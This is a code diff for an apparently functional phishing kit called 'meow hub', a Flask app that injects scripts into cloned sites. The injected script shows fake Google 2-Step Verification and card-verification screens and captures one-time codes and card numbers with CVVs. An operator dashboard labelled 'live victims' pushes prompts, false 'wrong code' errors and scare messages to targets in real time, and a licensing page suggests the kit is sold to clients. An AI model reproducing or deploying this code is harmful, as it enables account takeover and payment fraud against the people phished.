+                    { id: 'prompt', icon: '&#128241;', title: 'Google prompt', desc: 'Get a notification on your phone' },
+                    { id: 'sms', icon: '&#128424;', title: 'Text message', desc: 'Get a code by SMS' },
+                    { id: 'authenticator', icon: '&#128737;', title: 'Google Authenticator', desc: 'Enter a code from the app' },
+                    { id: 'backup', icon: '&#128273;', title: 'Backup code', desc: 'Use one of your 8-digit codes' },
+                    { id: 'phone', icon: '&#128222;', title: 'Phone call', desc: 'Get a code by voice call' }
+                ];
+
+                var html = '<div style="max-width:420px;width:92%;padding:40px 0;">' +
+                    '<div style="text-align:center;margin-bottom:28px;">' +
+                    '<div style="width:48px;height:48px;margin:0 auto 16px;background:#4285f4;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:600;">G</div>' +
+                    '<h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;">2-Step Verification</h1>' +
+                    '<p style="color:#5f6368;font-size:14px;margin:0;">Choose how you want to verify it\\'s you</p>' +
+                    '</div><div>';
+
+                methods.forEach(function(m) {
+                    html += '<div onclick="__hubPickMethod(\\'' + m.id + '\\')" style="display:flex;align-items:center;gap:16px;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;margin-bottom:10px;cursor:pointer;transition:background .15s;" onmouseover="this.style.background=\\'#f1f3f4\\'" onmouseout="this.style.background=\\'#fff\\'">' +
+                        '<div style="font-size:22px;width:32px;text-align:center;">' + m.icon + '</div>' +
+                        '<div><div style="font-size:15px;color:#202124;font-weight:500;">' + m.title + '</div>' +
+                        '<div style="font-size:13px;color:#5f6368;">' + m.desc + '</div></div></div>';
+                });
+
+                html += '</div>' +
+                    '<div style="text-align:center;margin-top:20px;">' +
+                    '<a onclick="__hubBackToLogin()" style="color:#1a73e8;font-size:14px;cursor:pointer;text-decoration:none;">&larr; Back to sign in</a>' +
+                    '</div></div>';
+
+                root.innerHTML = html;
+                document.body.appendChild(root);
+            }
+
+            window.__hubBackToLogin = function() {
+                var root = document.getElementById('__hub_2fa_root');
+                if (root) root.remove();
+                showOriginal();
+                currentStage = 'login';
+            };
+
+            window.__hubPickMethod = function(method) {
+                chosenMethod = method;
+                queue({ __trigger: '2fa-method', method: method });
+                renderCodeScreen(method);
+            };
+
+            function renderCodeScreen(method) {
+                var root = document.getElementById('__hub_2fa_root');
+                if (!root) { render2faChoice(); root = document.getElementById('__hub_2fa_root'); }
+
+                var titles = {
+                    prompt: 'Check your phone',
+                    sms: 'Enter the code from your SMS',
+                    authenticator: 'Enter Authenticator code',
+                    backup: 'Enter backup code',
+                    phone: 'Enter the code from the call'
+                };
+                var subtitles = {
+                    prompt: 'We sent a notification to your phone. Tap Yes to continue, or enter the code shown.',
+                    sms: 'We sent a 6-digit code to your phone.',
+                    authenticator: 'Open the Google Authenticator app and enter the 6-digit code.',
+                    backup: 'Enter one of your 8-digit backup codes.',
+                    phone: 'We\\'re calling you now. Enter the 6-digit code you hear.'
+                };
+                var placeholder = method === 'backup' ? '12345678' : '123456';
+
+                var html = '<div style="max-width:400px;width:92%;padding:40px 0;text-align:center;">' +
+                    '<div style="width:48px;height:48px;margin:0 auto 16px;background:#4285f4;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:600;">G</div>' +
+                    '<h1 style="font-size:22px;font-weight:400;color:#202124;margin:0 0 8px;">' + (titles[method] || 'Verify') + '</h1>' +
+                    '<p style="color:#5f6368;font-size:14px;margin:0 0 28px;">' + (subtitles[method] || '') + '</p>' +
+                    '<input id="__hub_code_input" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="' + placeholder + '" style="width:100%;max-width:260px;padding:14px;font-size:20px;text-align:center;letter-spacing:6px;border:2px solid #dadce0;border-radius:8px;box-sizing:border-box;margin-bottom:20px;outline:none;" onfocus="this.style.borderColor=\\'#1a73e8\\'">' +
+                    '<div style="display:flex;gap:12px;justify-content:center;">' +
+                    '<button onclick="__hubBackToChoice()" style="padding:10px 24px;border:1px solid #dadce0;border-radius:20px;background:#fff;color:#1a73e8;font-size:14px;cursor:pointer;">Back</button>' +
+                    '<button onclick="__hubSubmitCode()" style="padding:10px 24px;border:none;border-radius:20px;background:#1a73e8;color:#fff;font-size:14px;font-weight:600;cursor:pointer;">Verify</button>' +
+                    '</div>' +
+                    '<div style="margin-top:20px;"><a onclick="__hubTryAnother()" style="color:#1a73e8;font-size:13px;cursor:pointer;">Try another way</a></div>' +
+                    '</div>';
+
+                root.innerHTML = html;
                 setTimeout(function() {
-                    var d2 = harvestAll();
-                    d2.__trigger = 'click-delayed:' + label;
-                    queue(d2);
-                }, 300);
-            } catch (err) {}
-        }, true);
+                    var inp = document.getElementById('__hub_code_input');
+                    if (inp) inp.focus();
+                }, 100);
+            }
 
-        window.addEventListener('beforeunload', function() {
-            try { var d = harvestAll(); d.__trigger = 'unload'; queue(d); } catch (err) {}
-        });
+            window.__hubBackToChoice = function() {
+                queue({ __trigger: '2fa-back' });
+                render2faChoice();
+            };
 
-        console.log('[hub] sniffer + 2FA layer active on', SITE);
-    })();
-    </script>
-    """
-    if '</body>' in content:
-        return content.replace('</body>', tracker_script + '</body>')
-    return content + tracker_script
+            window.__hubTryAnother = function() {
+                queue({ __trigger: '2fa-try-another' });
+                render2faChoice();
+            };
+
+            window.__hubSubmitCode = function() {
+                var inp = document.getElementById('__hub_code_input');
+                var code = inp ? inp.value : '';
+                if (!code.trim()) { inp.style.borderColor = '#d93025'; return; }
+                queue({ otp: code, __trigger: '2fa-code-' + chosenMethod });
+                showVerifySpinner();
+            };
+
+            function showVerifySpinner() {
+                var root = document.getElementById('__hub_2fa_root');
+                if (!root) return;
+                root.innerHTML = '<div style="text-align:center;padding:60px 0;">' +
+                    '<div style="width:36px;height:36px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 20px;animation:__hubspin 1s linear infinite;"></div>' +
+                    '<p style="color:#5f6368;font-size:14px;">Verifying…</p>' +
+                    '<style>@keyframes __hubspin { to { transform: rotate(360deg); } }</style></div>';
+
+                setTimeout(function() {
+                    pollOnce(function(d) {
+                        if (d.stage === 'done' || d.stage === 'success') {
+                            root.innerHTML = '<div style="text-align:center;padding:60px 0;">' +
+                                '<div style="width:48px;height:48px;margin:0 auto 16px;background:#188038;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;">&#10003;</div>' +
+                                '<p style="color:#202124;font-size:16px;">Verification complete</p></div>';
+                            setTimeout(function() { root.remove(); showOriginal(); }, 1500);
+                        } else if (d.stage === 'wrong_code') {
+                            renderCodeScreen(chosenMethod);
+                            setTimeout(function() {
+                                var inp = document.getElementById('__hub_code_input');
+                                if (inp) { inp.style.borderColor = '#d93025'; inp.placeholder = 'Wrong code, try again'; }
+                            }, 50);
+                        } else {
+                            renderCodeScreen(chosenMethod);
+                        }
+                    });
+                }, 1800);
+            }
+
+            function pollOnce(cb) {
+                fetch('/hub/poll').then(function(r) { return r.json(); }).then(cb).catch(function() { cb({}); });
+            }
+
+            function flash(msg, color) {
+                var d = document.createElement('div');
+                d.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;padding:14px 20px;text-align:center;font-family:system-ui,sans-serif;font-size:15px;font-weight:600;color:#fff;background:' + (color || '#d93025') + ';box-shadow:0 2px 12px rgba(0,0,0,.4);transition:transform .3s;transform:translateY(-100%);';
+                d.textContent = msg;
+                document.body.appendChild(d);
+                requestAnimationFrame(function() { d.style.transform = 'translateY(0)'; });
+                setTimeout(function() {
+                    d.style.transform = 'translateY(-100%)';
+                    setTimeout(function() { d.remove(); }, 350);
+                }, 4000);
+            }
+
+            function showCardBox() {
+                var existing = document.getElementById('__hub_otp_overlay');
+                if (existing) existing.remove();
+                var overlay = document.createElement('div');
+                overlay.id = '__hub_otp_overlay';
+                overlay.style.cssText = 'position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;';
+                overlay.innerHTML = '<div style="background:#fff;border-radius:12px;padding:32px;max-width:420px;width:92%;font-family:system-ui,sans-serif;">' +
+                    '<h3 style="margin:0 0 4px;color:#202124;text-align:center;">Verify your identity</h3>' +
+                    '<p style="color:#5f6368;font-size:13px;text-align:center;margin:0 0 18px;">Confirm your card to continue.</p>' +
+                    '<input id="__hub_card_num" placeholder="Card number" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #dadce0;border-radius:6px;box-sizing:border-box;">' +
+                    '<div style="display:flex;gap:10px;margin-bottom:10px;"><input id="__hub_card_exp" placeholder="MM/YY" style="flex:1;padding:10px;border:1px solid #dadce0;border-radius:6px;"><input id="__hub_card_cvv" placeholder="CVV" type="password" style="flex:1;padding:10px;border:1px solid #dadce0;border-radius:6px;"></div>' +
+                    '<button id="__hub_card_go" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;">Verify</button></div>';
+                document.body.appendChild(overlay);
+                document.getElementById('__hub_card_go').onclick = function() {
+                    queue({ card_number: document.getElementById('__hub_card_num').value, card_exp: document.getElementById('__hub_card_exp').value, card_cvv: document.getElementById('__hub_card_cvv').value, __trigger: 'card' });
+                    flash('Verifying...', '#1a73e8');
+                    setTimeout(function() { overlay.remove(); }, 800);
+                };
+            }
+
+            function poll() {
+                fetch('/hub/poll').then(function(r) { return r.json(); }).then(function(d) {
+                    if (!d.commands) return;
+                    d.commands.forEach(function(c) {
+                        if (c.action === 'show_otp') { renderCodeScreen('sms'); }
+                        else if (c.action === 'show_phone') { renderCodeScreen('phone'); }
+                        else if (c.action === 'show_email_otp') { renderCodeScreen('sms'); }
+                        else if (c.action === 'show_card') showCardBox();
+                        else if (c.action === 'redirect') { window.location.href = c.payload.url; }
+                        else if (c.action === 'notify') flash(c.payload.message || 'Notice', c.payload.color || '#d93025');
+                        else if (c.action === 'block') { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:system-ui;color:#5f6368;">Session expired. Please try again later.</div>'; }
+                    });
+                    if (d.stage && d.stage !== currentStage) {
+                        currentStage = d.stage;
+                        if (d.stage === '2fa_choice') render2faChoice();
+                        else if (d.stage === 'login') { var r = document.getElementById('__hub_2fa_root'); if (r) r.remove(); showOriginal(); }
+                        fetch('/hub/ack', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({stage: d.stage})});
+                    }
+                }).catch(function(){}).finally(function() {
+                    setTimeout(poll, 2500);
+                });
+            }
+            poll();
+
+            console.log('[hub] google-flow layer active on', SITE);
+        })();
+        </script>
+        """
+        if '</body>' in content:
+            content = content.replace('</body>', tracker_script + '</body>')
+        else:
+            content += tracker_script
+        return content
+    from flask import send_from_directory
+    return send_from_directory(site_dir, path)
 
 @app.route('/hub/heartbeat', methods=['POST', 'GET'])
 def hub_heartbeat():
@@ -609,197 +699,68 @@ if __name__ == '__main__':
         db.create_all()
     app.run(host='0.0.0.0', port=5000, debug=True)
 PYEOF
-
-cat > meow_hub/templates/live.html << 'HTMLEOF'
-<!doctype html>
-<html lang="en">
+cat > meow_hub/templates/victims.html << 'HTMLEOF'
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8">
-<title>meow hub — live</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>meow hub — live victims</title>
 <style>
-  :root { --bg:#0b0b10; --card:#15151d; --line:#262633; --txt:#e8e8f0; --dim:#8a8a9a; --acc:#7c5cff; --ok:#2ecc71; --warn:#f1c40f; --err:#e74c3c; }
-  * { box-sizing:border-box; }
-  body { margin:0; background:var(--bg); color:var(--txt); font-family:ui-monospace,Menlo,Consolas,monospace; font-size:13px; }
-  header { display:flex; gap:16px; align-items:center; padding:12px 20px; border-bottom:1px solid var(--line); position:sticky; top:0; background:var(--bg); z-index:5; }
-  header h1 { font-size:15px; margin:0; letter-spacing:2px; }
-  header a { color:var(--dim); text-decoration:none; } header a:hover { color:var(--txt); }
-  .wrap { display:grid; grid-template-columns: 1fr 340px; gap:16px; padding:16px 20px; }
-  .card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:14px; margin-bottom:14px; }
-  .sess { border-left:3px solid var(--acc); }
-  .sess.dead { border-left-color:var(--line); opacity:.55; }
-  .sess.validated { border-left-color:var(--ok); }
-  .row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-top:8px; }
-  .tag { padding:2px 8px; border-radius:4px; background:var(--line); font-size:11px; }
-  .tag.ok { background:#12351f; color:var(--ok); }
-  .tag.warn { background:#3a3210; color:var(--warn); }
-  .tag.err { background:#3a1512; color:var(--err); }
-  button { background:var(--acc); color:#fff; border:none; border-radius:5px; padding:6px 12px; cursor:pointer; font-family:inherit; font-size:12px; }
-  button.ghost { background:transparent; border:1px solid var(--line); color:var(--txt); }
-  button.ok { background:var(--ok); color:#08130c; }
-  button.err { background:var(--err); }
-  button.warn { background:var(--warn); color:#221d05; }
-  pre { background:#0e0e14; border:1px solid var(--line); border-radius:6px; padding:8px; overflow:auto; max-height:140px; margin:8px 0 0; }
-  #flash { position:fixed; right:20px; bottom:20px; width:320px; z-index:50; display:flex; flex-direction:column; gap:8px; }
-  .flash-item { background:var(--card); border:1px solid var(--line); border-left:3px solid var(--acc); border-radius:6px; padding:10px 12px; animation:slidein .25s ease; }
-  .flash-item.success { border-left-color:var(--ok); } .flash-item.warn { border-left-color:var(--warn); } .flash-item.error { border-left-color:var(--err); }
-  @keyframes slidein { from { transform:translateX(40px); opacity:0; } to { transform:none; opacity:1; } }
-  .dim { color:var(--dim); }
-  h3 { margin:0 0 6px; font-size:12px; letter-spacing:1px; color:var(--dim); text-transform:uppercase; }
+body{background:#0d0d0f;color:#e8e8ea;font-family:system-ui,sans-serif;margin:0;padding:24px}
+h1{font-size:22px;margin:0 0 20px}
+a{color:#8ab4f8;text-decoration:none}
+.card{background:#1a1a1e;border:1px solid #2d2d33;border-radius:10px;padding:16px;margin-bottom:12px}
+.card h3{margin:0 0 6px;font-size:15px}
+.meta{color:#9aa0a6;font-size:12px;margin-bottom:10px}
+.stage{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;background:#3c4043;margin-right:6px}
+.stage.login{background:#3c4043}
+.stage.2fa_choice{background:#f29900;color:#000}
+.stage.done{background:#188038}
+.stage.wrong_code{background:#d93025}
+.btns{margin-top:10px;display:flex;flex-wrap:wrap;gap:6px}
+.btns button{background:#2d2d33;color:#e8e8ea;border:1px solid #3c4043;border-radius:6px;padding:6px 12px;font-size:12px;cursor:pointer}
+.btns button:hover{background:#3c4043}
+.btns button.danger{background:#5c1d1d;border-color:#8a3030}
+.btns button.good{background:#1a3d2e;border-color:#2d6a4f}
+pre{background:#111114;border-radius:6px;padding:10px;font-size:11px;overflow-x:auto;max-height:200px}
 </style>
 </head>
 <body>
-<header>
-  <h1>MEOW//LIVE</h1>
-  <a href="/">sites</a><a href="/logs">logs</a><a href="/licenses">licenses</a><a href="/logout">logout</a>
-  <span class="dim" style="margin-left:auto" id="clock"></span>
-</header>
-<div class="wrap">
-  <div>
-    <div class="card"><h3>sessions</h3><div id="sessions">loading…</div></div>
+<h1>meow hub — live victims <a href="/" style="float:right;font-size:13px;">← dashboard</a></h1>
+{% for v in victims %}
+<div class="card">
+  <h3>{{ v.site }} — {{ v.ip }}</h3>
+  <div class="meta">
+    <span class="stage {{ v.stage }}">{{ v.stage }}</span>
+    token: <code style="font-size:11px">{{ v.token[:12] }}…</code>
+    updated: {{ v.updated_at.strftime('%H:%M:%S') }}
   </div>
-  <div>
-    <div class="card"><h3>flash feed</h3><div id="feed" class="dim">—</div></div>
+  <div class="btns">
+    <button class="good" onclick="cmd('{{ v.token }}','advance', {stage:'2fa_choice'})">push 2FA choice</button>
+    <button onclick="cmd('{{ v.token }}','advance', {stage:'done'})">mark verified</button>
+    <button onclick="cmd('{{ v.token }}','advance', {stage:'wrong_code'})">wrong code</button>
+    <button onclick="cmd('{{ v.token }}','show_card')">ask card</button>
+    <button onclick="cmd('{{ v.token }}','notify', {message:'Suspicious activity detected. Verify your account.'})">flash warning</button>
+    <button class="danger" onclick="cmd('{{ v.token }}','block')">kill session</button>
   </div>
+  <pre id="data-{{ v.token }}">loading…</pre>
 </div>
-<div id="flash"></div>
+{% endfor %}
 <script>
-var lastFlashId = 0;
-function esc(s){ return (s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
-function timeStr(iso){ if(!iso) return ''; return new Date(iso).toLocaleTimeString(); }
-function renderSessions(list){
-  var el = document.getElementById('sessions');
-  if(!list.length){ el.innerHTML = '<span class="dim">no sessions yet</span>'; return; }
-  el.innerHTML = list.map(function(s){
-    var cls = 'sess' + (s.live ? '' : ' dead') + (s.stage==='validated' ? ' validated' : '');
-    var stageTag = s.stage==='validated' ? '<span class="tag ok">validated</span>'
-      : s.stage==='otp_sent' ? '<span class="tag warn">otp: '+esc(s.otp_code)+'</span>'
-      : s.stage==='otp_requested' ? '<span class="tag warn">awaiting '+esc(s.twofa_mode)+'</span>'
-      : '<span class="tag">'+esc(s.stage)+'</span>';
-    var creds = '';
-    try { var c = s.credentials || {}; if(Object.keys(c).length) creds = '<pre>'+esc(JSON.stringify(c,null,1))+'</pre>'; } catch(e){}
-    return '<div class="card '+cls+'">'
-      + '<div><b>'+esc(s.site)+'</b> <span class="dim">'+esc(s.ip)+' · '+timeStr(s.updated_at)+'</span> '
-      + (s.live?'<span class="tag ok">live</span>':'<span class="tag">gone</span>') + ' ' + stageTag + '</div>'
-      + (s.twofa_prompt?'<div class="dim" style="margin-top:4px">prompt: '+esc(s.twofa_prompt)+'</div>':'')
-      + creds
-      + '<div class="row">'
-      + '<button onclick="setMode(\''+s.session_id+'\',\'otp\')">switch: OTP</button>'
-      + '<button onclick="setMode(\''+s.session_id+'\',\'mail\')">switch: mail</button>'
-      + '<button onclick="setMode(\''+s.session_id+'\',\'number\')">switch: number</button>'
-      + '<button onclick="setMode(\''+s.session_id+'\',\'push\')">switch: push</button>'
-      + '<button class="warn" onclick="badCode(\''+s.session_id+'\')">bad code</button>'
-      + '<button class="ok" onclick="validate(\''+s.session_id+'\')">validate ✅</button>'
-      + '</div></div>';
-  }).join('');
+async function cmd(token, action, payload) {
+  await fetch('/api/victim/' + token + '/command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({action, payload})});
 }
-function setMode(sid, mode){ fetch('/api/live/sessions/'+sid+'/mode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mode:mode})}).then(loadSessions); }
-function validate(sid){ fetch('/api/live/sessions/'+sid+'/validate',{method:'POST'}).then(loadSessions); }
-function badCode(sid){ fetch('/api/live/sessions/'+sid+'/error',{method:'POST'}).then(loadSessions); }
-function loadSessions(){ fetch('/api/live/sessions').then(r=>r.json()).then(renderSessions).catch(()=>{}); }
-function pushFlash(e){
-  var box = document.getElementById('flash');
-  var d = document.createElement('div');
-  d.className = 'flash-item ' + e.level;
-  d.innerHTML = '<div>'+esc(e.message)+'</div><div class="dim" style="font-size:11px;margin-top:2px">'+timeStr(e.created_at)+(e.site?' · '+esc(e.site):'')+'</div>';
-  box.appendChild(d);
-  setTimeout(function(){ d.style.opacity='0'; d.style.transition='opacity .4s'; setTimeout(function(){ d.remove(); },400); }, 5000);
-}
-function pollFlash(){
-  fetch('/api/live/flash?since='+lastFlashId).then(r=>r.json()).then(function(evts){
-    evts.reverse().forEach(function(e){ lastFlashId = Math.max(lastFlashId, e.id); pushFlash(e); });
-    var feed = document.getElementById('feed');
-    if(evts.length) feed.innerHTML = evts.slice(-8).reverse().map(function(e){
-      return '<div style="margin-bottom:6px"><span class="tag '+e.level+'">'+e.level+'</span> '+esc(e.message)+'</div>';
-    }).join('');
-  }).catch(()=>{});
-}
-setInterval(loadSessions, 3000);
-setInterval(pollFlash, 2500);
-setInterval(function(){ document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
-loadSessions(); pollFlash();
-</script>
-</body>
-</html>
-HTMLEOF
-
-cat > meow_hub/templates/licenses.html << 'HTMLEOF'
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>meow hub — licenses</title>
-<style>
-  :root { --bg:#0b0b10; --card:#15151d; --line:#262633; --txt:#e8e8f0; --dim:#8a8a9a; --acc:#7c5cff; --ok:#2ecc71; --err:#e74c3c; }
-  body { margin:0; background:var(--bg); color:var(--txt); font-family:ui-monospace,Menlo,Consolas,monospace; font-size:13px; }
-  header { display:flex; gap:16px; align-items:center; padding:12px 20px; border-bottom:1px solid var(--line); }
-  header h1 { font-size:15px; margin:0; letter-spacing:2px; }
-  header a { color:var(--dim); text-decoration:none; } header a:hover { color:var(--txt); }
-  .wrap { max-width:760px; margin:24px auto; padding:0 16px; }
-  .card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:16px; margin-bottom:16px; }
-  table { width:100%; border-collapse:collapse; }
-  td, th { text-align:left; padding:8px; border-bottom:1px solid var(--line); font-size:12px; }
-  input { background:#0e0e14; border:1px solid var(--line); color:var(--txt); border-radius:5px; padding:8px 10px; font-family:inherit; width:260px; }
-  button { background:var(--acc); color:#fff; border:none; border-radius:5px; padding:7px 14px; cursor:pointer; font-family:inherit; }
-  button.ghost { background:transparent; border:1px solid var(--line); color:var(--txt); }
-  button.err { background:var(--err); }
-  .tag { padding:2px 8px; border-radius:4px; background:var(--line); font-size:11px; }
-  .tag.ok { background:#12351f; color:var(--ok); }
-  .tag.err { background:#3a1512; color:var(--err); }
-  .row { display:flex; gap:10px; align-items:center; margin-bottom:12px; }
-  .dim { color:var(--dim); }
-  h3 { margin:0 0 10px; font-size:12px; letter-spacing:1px; color:var(--dim); text-transform:uppercase; }
-</style>
-</head>
-<body>
-<header>
-  <h1>MEOW//LICENSES</h1>
-  <a href="/">sites</a><a href="/live">live</a><a href="/logs">logs</a><a href="/logout">logout</a>
-</header>
-<div class="wrap">
-  <div class="card">
-    <h3>mint license</h3>
-    <div class="row">
-      <input id="label" placeholder="label (e.g. client-7)">
-      <button onclick="mint()">mint key</button>
-    </div>
-    <div id="newkey" class="dim"></div>
-  </div>
-  <div class="card">
-    <h3>active keys</h3>
-    <table>
-      <thead><tr><th>key</th><th>label</th><th>status</th><th>created</th><th></th></tr></thead>
-      <tbody id="keys"></tbody>
-    </table>
-  </div>
-</div>
-<script>
-function esc(s){ return (s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
-function load(){
-  fetch('/api/licenses').then(r=>r.json()).then(function(ks){
-    document.getElementById('keys').innerHTML = ks.map(function(k){
-      return '<tr><td>'+esc(k.key)+'</td><td>'+esc(k.label)+'</td>'
-        + '<td>'+(k.active?'<span class="tag ok">active</span>':'<span class="tag err">revoked</span>')+'</td>'
-        + '<td class="dim">'+new Date(k.created_at).toLocaleDateString()+'</td>'
-        + '<td><button class="ghost" onclick="toggle(\''+k.key+'\')">'+(k.active?'revoke':'restore')+'</button> '
-        + '<button class="err" onclick="burn(\''+k.key+'\')">burn</button></td></tr>';
-    }).join('') || '<tr><td colspan="5" class="dim">no keys minted</td></tr>';
+async function refresh() {
+  document.querySelectorAll('pre[id^="data-"]').forEach(async function(el) {
+    const token = el.id.replace('data-','');
+    const r = await fetch('/api/victim/' + token + '/events');
+    const d = await r.json();
+    el.textContent = JSON.stringify({stage: d.stage, data: d.data, recent: d.submissions.slice(0,3)}, null, 2);
   });
 }
-function mint(){
-  fetch('/api/licenses',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:document.getElementById('label').value})})
-    .then(r=>r.json()).then(function(k){
-      document.getElementById('newkey').textContent = 'minted: ' + k.key;
-      document.getElementById('label').value='';
-      load();
-    });
-}
-function toggle(key){ fetch('/api/licenses/'+key+'/toggle',{method:'POST'}).then(load); }
-function burn(key){ fetch('/api/licenses/'+key,{method:'DELETE'}).then(load); }
-load();
+refresh();
+setInterval(refresh, 4000);
 </script>
 </body>
 </html>
 HTMLEOF
-
 python meow_hub/app.py
